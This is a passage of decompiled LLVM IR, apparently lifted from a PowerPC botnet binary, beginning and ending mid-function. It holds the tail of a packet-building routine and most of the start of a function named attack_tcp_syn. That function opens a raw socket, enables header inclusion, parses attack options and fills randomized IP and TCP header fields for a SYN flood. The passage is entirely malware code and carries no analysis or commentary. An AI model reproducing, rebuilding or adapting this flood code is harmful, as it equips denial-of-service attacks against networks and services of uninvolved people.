  store i32 %v0_10003db4, i32* %r3.global-to-local, align 4
  store i32 %v2_10003ab4, i32* %r0.global-to-local, align 4
  %v2_10003dbc = icmp slt i32 %v2_10003ab4, %v0_10003db4
  %v4_10003dbc = icmp eq i32 %v2_10003ab4, %v0_10003db4
  store i1 %v4_10003dbc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10003dbc, label %dec_label_pc_10003dc4, label %dec_label_pc_10003cb0

dec_label_pc_10003dc4:                            ; preds = %dec_label_pc_10003db0, %entry, %dec_label_pc_10003edc
  store i32 %v0_10003880, i32* %r0.global-to-local, align 4
  %v1_10003dd8 = call %0 @__asm_mtcrf(i32 56, i32 %v0_1000386c)
  store i32 %v0_100038bc, i32* %r24.global-to-local, align 4
  store i32 %v0_100038c0, i32* %r25.global-to-local, align 4
  store i32 %v0_100038c4, i32* %r26.global-to-local, align 4
  store i32 %v0_100038d0, i32* %r29.global-to-local, align 4
  %v0_10003e20 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10003e20

dec_label_pc_10003e24:                            ; preds = %dec_label_pc_10003e7c, %dec_label_pc_10003d14
  %v0_10003e24 = call i32 @rand_next()
  %v1_10003e24 = trunc i32 %v0_10003e24 to i16
  store i32 %v0_10003e24, i32* %r3.global-to-local, align 4
  %v3_10003e28 = load i32, i32* @r27, align 4
  %v4_10003e28 = add i32 %v3_10003e28, 2
  %v5_10003e28 = inttoptr i32 %v4_10003e28 to i16*
  store i16 %v1_10003e24, i16* %v5_10003e28, align 2
  %v0_10003e2c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10003e2c, label %dec_label_pc_10003e30, label %dec_label_pc_10003d1c

dec_label_pc_10003e30:                            ; preds = %dec_label_pc_10003e24, %dec_label_pc_10003d18
  %v0_10003e30 = call i32 @rand_next()
  store i32 %v0_10003e30, i32* %r3.global-to-local, align 4
  %v0_10003e34 = load i32, i32* %r20.global-to-local, align 4
  %v1_10003e34 = mul i32 %v0_10003e34, 16
  %v2_10003e34 = udiv i32 %v0_10003e34, 268435456
  %v3_10003e34 = or i32 %v2_10003e34, %v1_10003e34
  store i32 %v3_10003e34, i32* %r20.global-to-local, align 4
  %v1_10003e38 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10003e34)
  %v1_10003e3c = mul nuw i32 %v2_10003e34, 268435456
  %v2_10003e3c = urem i32 %v0_10003e34, 268435456
  %v3_10003e3c = or i32 %v1_10003e3c, %v2_10003e3c
  store i32 %v3_10003e3c, i32* %r20.global-to-local, align 4
  %v1_10003e40 = load i32, i32* @r27, align 4
  %v2_10003e40 = add i32 %v1_10003e40, 4
  %v3_10003e40 = inttoptr i32 %v2_10003e40 to i32*
  store i32 %v0_10003e30, i32* %v3_10003e40, align 4
  %v0_10003e44 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10003e44, label %dec_label_pc_10003e48, label %dec_label_pc_10003d2c

dec_label_pc_10003e48:                            ; preds = %dec_label_pc_10003e30, %dec_label_pc_10003d1c
  %v0_10003e48 = call i32 @rand_next()
  store i32 %v0_10003e48, i32* %r3.global-to-local, align 4
  %v0_10003e4c = load i32, i32* %r22.global-to-local, align 4
  %v1_10003e4c = mul i32 %v0_10003e4c, 16
  %v2_10003e4c = udiv i32 %v0_10003e4c, 268435456
  %v3_10003e4c = or i32 %v2_10003e4c, %v1_10003e4c
  store i32 %v3_10003e4c, i32* %r22.global-to-local, align 4
  %v1_10003e50 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10003e4c)
  %v1_10003e54 = mul nuw i32 %v2_10003e4c, 268435456
  %v2_10003e54 = urem i32 %v0_10003e4c, 268435456
  %v3_10003e54 = or i32 %v1_10003e54, %v2_10003e54
  store i32 %v3_10003e54, i32* %r22.global-to-local, align 4
  %v1_10003e58 = load i32, i32* @r27, align 4
  %v2_10003e58 = add i32 %v1_10003e58, 8
  %v3_10003e58 = inttoptr i32 %v2_10003e58 to i32*
  store i32 %v0_10003e48, i32* %v3_10003e58, align 4
  %v0_10003e5c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10003e5c, label %dec_label_pc_10003d3c, label %dec_label_pc_10003e60

dec_label_pc_10003e60:                            ; preds = %dec_label_pc_10003d2c, %dec_label_pc_10003e48
  %v0_10003e60 = load i32, i32* @r28, align 4
  %v1_10003e60 = add i32 %v0_10003e60, 40
  store i32 %v1_10003e60, i32* @r29, align 4
  %v0_10003e64 = load i32, i32* @r30, align 4
  store i32 %v0_10003e64, i32* @r4, align 4
  store i32 %v1_10003e60, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10003e70.84 to i32), i32* @lr, align 4
  %v0_10003e6c = call i32 @rand_alphastr()
  store i32 %v0_10003e6c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10003e74 = load i32, i32* @r29, align 4
  %v2_10003e74 = load i32, i32* @r30, align 4
  %v4_10003e74 = add i32 %v2_10003e74, %v1_10003e74
  %v5_10003e74 = inttoptr i32 %v4_10003e74 to i8*
  store i8 0, i8* %v5_10003e74, align 1
  br label %dec_label_pc_10003d3c

dec_label_pc_10003e7c:                            ; preds = %dec_label_pc_10003e8c, %dec_label_pc_10003d10
  %v0_10003e7c = call i32 @rand_next()
  %v1_10003e7c = trunc i32 %v0_10003e7c to i16
  store i32 %v0_10003e7c, i32* %r3.global-to-local, align 4
  %v3_10003e80 = load i32, i32* @r28, align 4
  %v4_10003e80 = add i32 %v3_10003e80, 20
  %v5_10003e80 = inttoptr i32 %v4_10003e80 to i16*
  store i16 %v1_10003e7c, i16* %v5_10003e80, align 2
  %v0_10003e84 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10003e84, label %dec_label_pc_10003e24, label %dec_label_pc_10003d18

dec_label_pc_10003e8c:                            ; preds = %dec_label_pc_10003d00
  %v0_10003e8c = call i32 @rand_next()
  %v1_10003e8c = trunc i32 %v0_10003e8c to i16
  store i32 %v0_10003e8c, i32* %r3.global-to-local, align 4
  %v3_10003e90 = load i32, i32* @r28, align 4
  %v4_10003e90 = add i32 %v3_10003e90, 4
  %v5_10003e90 = inttoptr i32 %v4_10003e90 to i16*
  store i16 %v1_10003e8c, i16* %v5_10003e90, align 2
  %v0_10003e94 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10003e94, label %dec_label_pc_10003e7c, label %dec_label_pc_10003d14

dec_label_pc_10003e9c:                            ; preds = %dec_label_pc_10003cd0
  %v1_10003e9c = add i32 %v2_10003cdc, 16
  %v2_10003e9c = inttoptr i32 %v1_10003e9c to i32*
  %v3_10003e9c = load i32, i32* %v2_10003e9c, align 4
  store i32 %v3_10003e9c, i32* %r29.global-to-local, align 4
  %v0_10003ea0 = call i32 @rand_next()
  store i32 %v0_10003ea0, i32* %r3.global-to-local, align 4
  %v3_10003ea4 = load i32, i32* %stack_var_-136, align 4
  store i32 %v3_10003ea4, i32* %r9.global-to-local, align 4
  %v0_10003ea8 = load i32, i32* %r21.global-to-local, align 4
  %v1_10003ea8 = mul i32 %v0_10003ea8, 16
  %v2_10003ea8 = udiv i32 %v0_10003ea8, 268435456
  %v3_10003ea8 = or i32 %v2_10003ea8, %v1_10003ea8
  store i32 %v3_10003ea8, i32* %r21.global-to-local, align 4
  %v1_10003eac = call %0 @__asm_mtcrf(i32 1, i32 %v3_10003ea8)
  %v1_10003eb0 = mul nuw i32 %v2_10003ea8, 268435456
  %v2_10003eb0 = urem i32 %v0_10003ea8, 268435456
  %v3_10003eb0 = or i32 %v1_10003eb0, %v2_10003eb0
  store i32 %v3_10003eb0, i32* %r21.global-to-local, align 4
  %v0_10003eb4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003eb4 = mul i32 %v0_10003eb4, 24
  %v1_10003eb8 = load i32, i32* @r31, align 4
  %v2_10003eb8 = add i32 %v1_10003eb8, %v1_10003eb4
  store i32 %v2_10003eb8, i32* %r9.global-to-local, align 4
  %v1_10003ebc = add i32 %v2_10003eb8, 20
  %v2_10003ebc = inttoptr i32 %v1_10003ebc to i8*
  %v3_10003ebc = load i8, i8* %v2_10003ebc, align 1
  %v4_10003ebc = zext i8 %v3_10003ebc to i32
  store i32 %v4_10003ebc, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10003ebc, 64
  %v2_10003ec0 = zext i8 %tmp to i32
  %v3_10003ec0 = lshr i32 %v0_10003ea0, %v2_10003ec0
  %v1_10003ec4 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003ec4 = add i32 %v3_10003ec0, %v1_10003ec4
  store i32 %v2_10003ec4, i32* %r3.global-to-local, align 4
  %v1_10003ec8 = load i32, i32* @r28, align 4
  %v2_10003ec8 = add i32 %v1_10003ec8, 16
  %v3_10003ec8 = inttoptr i32 %v2_10003ec8 to i32*
  store i32 %v2_10003ec4, i32* %v3_10003ec8, align 4
  %v0_10003ecc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10003ecc, label %dec_label_pc_10003ed0, label %dec_label_pc_10003d00

dec_label_pc_10003ed0:                            ; preds = %dec_label_pc_10003e9c, %dec_label_pc_10003cf0
  %v0_10003ed0 = call i32 @rand_next()
  store i32 %v0_10003ed0, i32* %r3.global-to-local, align 4
  %v1_10003ed4 = load i32, i32* @r28, align 4
  %v2_10003ed4 = add i32 %v1_10003ed4, 12
  %v3_10003ed4 = inttoptr i32 %v2_10003ed4 to i32*
  store i32 %v0_10003ed0, i32* %v3_10003ed4, align 4
  br label %dec_label_pc_10003d00

dec_label_pc_10003edc:                            ; preds = %dec_label_pc_10003ad4
  %v0_10003edc = load i32, i32* %r19.global-to-local, align 4
  store i32 %v0_10003edc, i32* @r3, align 4
  %v0_10003ee0 = call i32 @__GI___libc_close()
  store i32 %v0_10003ee0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003dc4

; uselistorder directives
  uselistorder i32 %v0_10003ea8, { 2, 1, 0 }
  uselistorder i32 %v0_10003e8c, { 1, 0 }
  uselistorder i32 %v0_10003e7c, { 1, 0 }
  uselistorder i32 %v0_10003e4c, { 2, 1, 0 }
  uselistorder i32 %v0_10003e34, { 2, 1, 0 }
  uselistorder i32 %v0_10003e24, { 1, 0 }
  uselistorder i32 %v0_10003db4, { 1, 0, 2 }
  uselistorder i32 %v1_10003da0, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v4_10003d68, { 1, 0 }
  uselistorder i32 %v0_10003d2c, { 2, 1, 0 }
  uselistorder i32 %v0_10003d1c, { 2, 1, 0 }
  uselistorder i32 %v0_10003d00, { 2, 1, 0 }
  uselistorder i32 %v0_10003cf0, { 2, 1, 0 }
  uselistorder i32 %v1_10003cd4, { 1, 0 }
  uselistorder i32 %v0_10003ca8, { 1, 0 }
  uselistorder i32 %v1_10003c3c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10003b78, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10003b74, { 1, 0 }
  uselistorder i32 %v1_10003b64, { 1, 0 }
  uselistorder i32 %v1_10003b4c, { 1, 0 }
  uselistorder i32 %v1_10003b38, { 1, 0 }
  uselistorder i32 %v1_10003b2c, { 1, 0 }
  uselistorder i32 %v1_10003b24, { 1, 0 }
  uselistorder i32 %v2_10003ab4, { 1, 2, 0 }
  uselistorder i32 %v6_10003aa0, { 2, 1, 0 }
  uselistorder i32 %v5_100039a4, { 2, 1, 0 }
  uselistorder i8 %v5_1000390c, { 1, 0 }
  uselistorder i32* %stack_var_-136, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 26, 16, 17, 18, 19, 20, 21, 2, 1, 0, 4, 22, 23, 24, 3, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 5 }
  uselistorder i32* %r22.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r21.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r20.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_10003e60, { 1, 0 }
  uselistorder label %dec_label_pc_10003dc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10003d3c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003d00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10003c2c, { 1, 0 }
  uselistorder label %dec_label_pc_10003bbc, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_10003eec = load i32, i32* @lr, align 4
  store i32 %v0_10003eec, i32* %r0.global-to-local, align 4
  %v0_10003ef0 = call i32 @__asm_mfcr()
  store i32 0, i32* %r15.global-to-local, align 4
  store i32 %arg2, i32* @r21, align 4
  %v0_10003f04 = load i32, i32* @r27, align 4
  store i32 %v0_10003ef0, i32* @r27, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v0_10003f14 = load i32, i32* %r0.global-to-local, align 4
  %v0_10003f3c = load i32, i32* @r25, align 4
  %v0_10003f40 = load i32, i32* @r26, align 4
  %v0_10003f44 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_10003f4c = load i32, i32* @r29, align 4
  store i32 %arg5, i32* %r29.global-to-local, align 4
  %v0_10003f54 = load i32, i32* @r30, align 4
  store i32 0, i32* %stack_var_-136, align 4
  store i32 268451692, i32* @lr, align 4
  %v2_10003f68 = call i32 @calloc(i32 %arg2, i32 4)
  store i32 %v2_10003f68, i32* @r22, align 4
  %v0_10003f70 = load i32, i32* @r29, align 4
  %v0_10003f7c = load i32, i32* @r28, align 4
  store i32 %v0_10003f7c, i32* %r3.global-to-local, align 4
  store i32 268451716, i32* @lr, align 4
  %v4_10003f80 = inttoptr i32 %v0_10003f70 to i32*
  %v5_10003f80 = call i32 @attack_get_opt_int(i32 %v0_10003f7c, i32* %v4_10003f80, i32 2, i32 0)
  %v5_10003f90 = trunc i32 %v5_10003f80 to i8
  %v0_10003f98 = load i32, i32* @r29, align 4
  %v0_10003f9c = load i32, i32* @r28, align 4
  store i32 %v0_10003f9c, i32* %r3.global-to-local, align 4
  store i32 268451748, i32* @lr, align 4
  %v4_10003fa0 = inttoptr i32 %v0_10003f98 to i32*
  %v5_10003fa0 = call i32 @attack_get_opt_int(i32 %v0_10003f9c, i32* %v4_10003fa0, i32 3, i32 65535)
  %v0_10003fa4 = load i32, i32* @r29, align 4
  store i32 %v5_10003fa0, i32* %r16.global-to-local, align 4
  %v0_10003fb4 = load i32, i32* @r28, align 4
  store i32 %v0_10003fb4, i32* %r3.global-to-local, align 4
  store i32 268451772, i32* @lr, align 4
  %v4_10003fb8 = inttoptr i32 %v0_10003fa4 to i32*
  %v5_10003fb8 = call i32 @attack_get_opt_int(i32 %v0_10003fb4, i32* %v4_10003fb8, i32 4, i32 64)
  %v0_10003fbc = load i32, i32* @r29, align 4
  %v5_10003fc8 = trunc i32 %v5_10003fb8 to i8
  %v0_10003fd0 = load i32, i32* @r28, align 4
  store i32 %v0_10003fd0, i32* %r3.global-to-local, align 4
  store i32 268451800, i32* @lr, align 4
  %v4_10003fd4 = inttoptr i32 %v0_10003fbc to i32*
  %v5_10003fd4 = call i32 @attack_get_opt_int(i32 %v0_10003fd0, i32* %v4_10003fd4, i32 5, i32 1)
  %v1_10003fdc = urem i32 %v5_10003fd4, 256
  %v0_10003fec = load i32, i32* @r29, align 4
  %v0_10003ff0 = load i32, i32* @r28, align 4
  store i32 %v0_10003ff0, i32* %r3.global-to-local, align 4
  store i32 268451832, i32* @lr, align 4
  %v4_10003ff4 = inttoptr i32 %v0_10003fec to i32*
  %v5_10003ff4 = call i32 @attack_get_opt_int(i32 %v0_10003ff0, i32* %v4_10003ff4, i32 6, i32 65535)
  %v0_10003ffc = load i32, i32* @r29, align 4
  store i32 %v5_10003ff4, i32* %r17.global-to-local, align 4
  %v0_1000400c = load i32, i32* @r28, align 4
  store i32 %v0_1000400c, i32* %r3.global-to-local, align 4
  store i32 268451860, i32* @lr, align 4
  %v4_10004010 = inttoptr i32 %v0_10003ffc to i32*
  %v5_10004010 = call i32 @attack_get_opt_int(i32 %v0_1000400c, i32* %v4_10004010, i32 7, i32 65535)
  %v0_10004018 = load i32, i32* @r29, align 4
  store i32 %v5_10004010, i32* %r18.global-to-local, align 4
  %v0_10004028 = load i32, i32* @r28, align 4
  store i32 %v0_10004028, i32* %r3.global-to-local, align 4
  store i32 268451888, i32* @lr, align 4
  %v4_1000402c = inttoptr i32 %v0_10004018 to i32*
  %v5_1000402c = call i32 @attack_get_opt_int(i32 %v0_10004028, i32* %v4_1000402c, i32 16, i32 65535)
  %v0_10004030 = load i32, i32* @r29, align 4
  %v0_10004040 = load i32, i32* @r28, align 4
  store i32 %v0_10004040, i32* %r3.global-to-local, align 4
  store i32 268451912, i32* @lr, align 4
  %v4_10004044 = inttoptr i32 %v0_10004030 to i32*
  %v5_10004044 = call i32 @attack_get_opt_int(i32 %v0_10004040, i32* %v4_10004044, i32 17, i32 0)
  %v0_10004048 = load i32, i32* @r29, align 4
  %v0_10004058 = load i32, i32* @r28, align 4
  store i32 %v0_10004058, i32* %r3.global-to-local, align 4
  store i32 268451936, i32* @lr, align 4
  %v4_1000405c = inttoptr i32 %v0_10004048 to i32*
  %v5_1000405c = call i32 @attack_get_opt_int(i32 %v0_10004058, i32* %v4_1000405c, i32 10, i32 0)
  %v0_10004060 = load i32, i32* @r29, align 4
  store i32 %v5_1000405c, i32* %r19.global-to-local, align 4
  %v0_10004070 = load i32, i32* @r28, align 4
  store i32 %v0_10004070, i32* %r3.global-to-local, align 4
  store i32 268451960, i32* @lr, align 4
  %v4_10004074 = inttoptr i32 %v0_10004060 to i32*
  %v5_10004074 = call i32 @attack_get_opt_int(i32 %v0_10004070, i32* %v4_10004074, i32 11, i32 0)
  %v0_10004078 = load i32, i32* @r29, align 4
  store i32 %v5_10004074, i32* %r20.global-to-local, align 4
  %v0_10004088 = load i32, i32* @r28, align 4
  store i32 %v0_10004088, i32* %r3.global-to-local, align 4
  store i32 268451984, i32* @lr, align 4
  %v4_1000408c = inttoptr i32 %v0_10004078 to i32*
  %v5_1000408c = call i32 @attack_get_opt_int(i32 %v0_10004088, i32* %v4_1000408c, i32 12, i32 0)
  %v0_10004090 = load i32, i32* @r29, align 4
  store i32 %v5_1000408c, i32* %r24.global-to-local, align 4
  %v0_100040a0 = load i32, i32* @r28, align 4
  store i32 %v0_100040a0, i32* %r3.global-to-local, align 4
  store i32 268452008, i32* @lr, align 4
  %v4_100040a4 = inttoptr i32 %v0_10004090 to i32*
  %v5_100040a4 = call i32 @attack_get_opt_int(i32 %v0_100040a0, i32* %v4_100040a4, i32 13, i32 0)
  %v0_100040a8 = load i32, i32* @r29, align 4
  store i32 %v5_100040a4, i32* %r25.global-to-local, align 4
  %v0_100040b8 = load i32, i32* @r28, align 4
  store i32 %v0_100040b8, i32* %r3.global-to-local, align 4
  store i32 268452032, i32* @lr, align 4
  %v4_100040bc = inttoptr i32 %v0_100040a8 to i32*
  %v5_100040bc = call i32 @attack_get_opt_int(i32 %v0_100040b8, i32* %v4_100040bc, i32 14, i32 1)
  %v0_100040c0 = load i32, i32* @r29, align 4
  store i32 %v5_100040bc, i32* %r26.global-to-local, align 4
  %v0_100040d0 = load i32, i32* @r28, align 4
  store i32 %v0_100040d0, i32* %r3.global-to-local, align 4
  store i32 268452056, i32* @lr, align 4
  %v4_100040d4 = inttoptr i32 %v0_100040c0 to i32*
  %v5_100040d4 = call i32 @attack_get_opt_int(i32 %v0_100040d0, i32* %v4_100040d4, i32 15, i32 0)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_100040dc = load i32, i32* @global_var_100211e0.76, align 4
  %v0_100040e0 = load i32, i32* @r29, align 4
  store i32 %v5_100040d4, i32* %r30.global-to-local, align 4
  %v0_100040ec = load i32, i32* @r28, align 4
  store i32 %v0_100040ec, i32* %r3.global-to-local, align 4
  store i32 268452084, i32* @lr, align 4
  %v5_100040f0 = inttoptr i32 %v0_100040e0 to i32*
  %v6_100040f0 = call i32 @attack_get_opt_ip(i32 %v0_100040ec, i32* %v5_100040f0, i32 24, i32 %v3_100040dc, i32 268566528)
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_100040fc = call i32 @__GI_time()
  %v1_10004104 = load i32, i32* @r27, align 4
  %v2_10004104 = add i32 %v1_10004104, %v0_100040fc
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268452120, i32* @lr, align 4
  %v3_10004114 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_10004114, i32* %r3.global-to-local, align 4
  %v3_10004118 = icmp eq i32 %v3_10004114, -1
  store i1 %v3_10004118, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10004114, i32* @r23, align 4
  br i1 %v3_10004118, label %dec_label_pc_1000442c, label %dec_label_pc_10004124

dec_label_pc_10004124:                            ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10004130 = ptrtoint i32* %stack_var_-136 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-136, align 4
  store i32 268452160, i32* @lr, align 4
  %v5_1000413c = call i32 @__GI_setsockopt(i32 0, i32 3, i32 %v2_10004130, i32 4, i32 4)
  store i32 %v5_1000413c, i32* %r3.global-to-local, align 4
  %v3_10004140 = icmp eq i32 %v5_1000413c, -1
  store i1 %v3_10004140, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004140, label %dec_label_pc_10004534, label %dec_label_pc_10004148

dec_label_pc_10004148:                            ; preds = %dec_label_pc_10004124
  %v0_10004148 = load i32, i32* @r21, align 4
  %v3_10004148 = icmp eq i32 %v0_10004148, 0
  store i1 %v3_10004148, i1* %cr7_eq.global-to-local, align 1
  %v0_1000414c = load i32, i32* %r19.global-to-local, align 4
  %v1_1000414c = urem i32 %v0_1000414c, 256
  store i32 %v1_1000414c, i32* %r19.global-to-local, align 4
  %v0_10004150 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10004150, i32* %stack_var_-136, align 4
  %v0_10004154 = load i32, i32* %r16.global-to-local, align 4
  %v1_10004154 = urem i32 %v0_10004154, 65536
  store i32 %v1_10004154, i32* %r14.global-to-local, align 4
  %v0_10004158 = call i32 @__asm_mfcr()
  store i32 %v0_10004158, i32* %r3.global-to-local, align 4
  %v1_1000415c = mul i32 %v0_10004158, 268435456
  store i32 %v1_1000415c, i32* %r0.global-to-local, align 4
  %v0_10004160 = load i32, i32* %r17.global-to-local, align 4
  %v1_10004160 = urem i32 %v0_10004160, 65536
  store i32 %v1_10004160, i32* %r15.global-to-local, align 4
  %v0_10004164 = load i32, i32* %r18.global-to-local, align 4
  %v1_10004164 = urem i32 %v0_10004164, 65536
  store i32 %v1_10004164, i32* %r16.global-to-local, align 4
  %v0_10004168 = load i32, i32* %r19.global-to-local, align 4
  %v0_10004170 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004170, label %dec_label_pc_100042c4, label %dec_label_pc_10004174

dec_label_pc_10004174:                            ; preds = %dec_label_pc_10004148
  store i32 %v1_10003fdc, i32* %r9.global-to-local, align 4
  store i32 %v0_10004168, i32* %r0.global-to-local, align 4
  %v0_1000417c = load i32, i32* %r20.global-to-local, align 4
  %v1_1000417c = urem i32 %v0_1000417c, 2
  store i32 %v1_1000417c, i32* %r17.global-to-local, align 4
  %v0_10004180 = load i32, i32* %r24.global-to-local, align 4
  %v1_10004180 = urem i32 %v0_10004180, 2
  store i32 %v1_10004180, i32* %r19.global-to-local, align 4
  %v3_10004184 = icmp eq i32 %v1_10003fdc, 0
  store i1 %v3_10004184, i1* %cr4_eq.global-to-local, align 1
  %v0_10004188 = load i32, i32* %r25.global-to-local, align 4
  %v1_10004188 = urem i32 %v0_10004188, 2
  store i32 %v1_10004188, i32* %r20.global-to-local, align 4
  %v0_1000418c = load i32, i32* %r26.global-to-local, align 4
  %v1_1000418c = urem i32 %v0_1000418c, 2
  store i32 %v1_1000418c, i32* %r24.global-to-local, align 4
  %v0_10004190 = load i32, i32* %r30.global-to-local, align 4
  %v1_10004190 = urem i32 %v0_10004190, 2
  store i32 %v1_10004190, i32* %r25.global-to-local, align 4
  %v1_10004194 = urem i32 %v0_10004168, 2
  store i32 %v1_10004194, i32* %r18.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  %v4_100041f4 = sext i8 %v5_10003f90 to i32
  br label %dec_label_pc_1000419c

dec_label_pc_1000419c:                            ; preds = %dec_label_pc_10004214, %dec_label_pc_10004174
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 268452264, i32* @lr, align 4
  %v2_100041a4 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_100041a4, i32* %r3.global-to-local, align 4
  %v3_100041a8 = load i32, i32* %stack_var_-136, align 4
  store i32 %v3_100041a8, i32* %r0.global-to-local, align 4
  %v0_100041ac = load i32, i32* @r29, align 4
  %v1_100041ac = mul i32 %v0_100041ac, 4
  store i32 4, i32* %r30.global-to-local, align 4
  %v2_100041b4 = load i32, i32* @r22, align 4
  %v3_100041b4 = add i32 %v2_100041b4, %v1_100041ac
  %v4_100041b4 = inttoptr i32 %v3_100041b4 to i32*
  store i32 %v2_100041a4, i32* %v4_100041b4, align 4
  %v0_100041b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100041b8 = mul i32 %v0_100041b8, 24
  store i32 %v1_100041b8, i32* %r11.global-to-local, align 4
  %v1_100041bc = mul i32 %v0_100041b8, 4
  store i32 %v1_100041bc, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v0_100041c4 = load i32, i32* @r22, align 4
  %v2_100041c4 = add i32 %v0_100041c4, %v1_100041bc
  %v3_100041c4 = inttoptr i32 %v2_100041c4 to i32*
  %v4_100041c4 = load i32, i32* %v3_100041c4, align 4
  store i32 %v4_100041c4, i32* %r29.global-to-local, align 4
  store i32 6, i32* %r26.global-to-local, align 4
  store i32 10, i32* %r27.global-to-local, align 4
  store i32 2, i32* %r28.global-to-local, align 4
  %v1_100041d4 = inttoptr i32 %v4_100041c4 to i32*
  %v2_100041d4 = load i32, i32* %v1_100041d4, align 4
  store i32 %v2_100041d4, i32* %r0.global-to-local, align 4
  %v1_100041d8 = load i32, i32* @r31, align 4
  %v2_100041d8 = add i32 %v1_100041d8, %v1_100041b8
  store i32 %v2_100041d8, i32* %r11.global-to-local, align 4
  %v0_100041dc = load i32, i32* %r14.global-to-local, align 4
  %v1_100041dc = trunc i32 %v0_100041dc to i16
  %v3_100041dc = add i32 %v4_100041c4, 4
  %v4_100041dc = inttoptr i32 %v3_100041dc to i16*
  store i16 %v1_100041dc, i16* %v4_100041dc, align 2
  %v2_100041e0 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v2_100041e0, i32* %r0.global-to-local, align 4
  %v1_100041e4 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 60, i32* %r9.global-to-local, align 4
  %v1_100041ec = load i32, i32* %r29.global-to-local, align 4
  %v2_100041ec = inttoptr i32 %v1_100041ec to i32*
  store i32 %v1_100041e4, i32* %v2_100041ec, align 4
  %v0_100041f0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100041f0 = trunc i32 %v0_100041f0 to i16
  %v2_100041f0 = load i32, i32* %r29.global-to-local, align 4
  %v3_100041f0 = add i32 %v2_100041f0, 2
  %v4_100041f0 = inttoptr i32 %v3_100041f0 to i16*
  store i16 %v1_100041f0, i16* %v4_100041f0, align 2
